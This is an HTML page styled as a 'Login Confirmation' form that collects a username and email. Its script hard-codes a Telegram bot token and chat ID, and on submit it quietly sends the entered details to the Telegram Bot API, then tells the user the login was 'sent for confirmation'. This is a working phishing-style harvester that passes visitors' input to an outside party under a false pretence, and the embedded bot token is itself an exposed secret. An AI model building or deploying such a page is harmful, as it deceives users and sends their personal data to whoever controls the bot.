<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login Confirmation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    form {
      background: #020617;
      padding: 25px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 15px #2563eb;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 12px;
      border-radius: 5px;
      border: none;
    }
    button {
      background: #2563eb;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background: #1e40af;
    }
  </style>
</head>
<body>

<form id="loginForm">
  <h2>Login</h2>

  <input type="text" id="username" placeholder="Username" required>
  <input type="email" id="email" placeholder="Email" required>

  <button type="submit">Login</button>

  <p id="status"></p>
</form>

<script>
  const BOT_TOKEN = "8302209505:AAETdoq4uzxNYxH9FzFIVRYEdIBX0obPjKA";
  const CHAT_ID = "8163348828";

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const email = document.getElementById("email").value;

    const message = `
?? New Login Attempt

?? Username: ${username}
?? Email: ${email}
? Time: ${new Date().toLocaleString()}
    `;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      document.getElementById("status").innerText = "Login sent for confirmation ?";
    })
    .catch(error => {
      document.getElementById("status").innerText = "Error sending login ?";
      console.error(error);
    });
  });
</script>

</body>
</html>
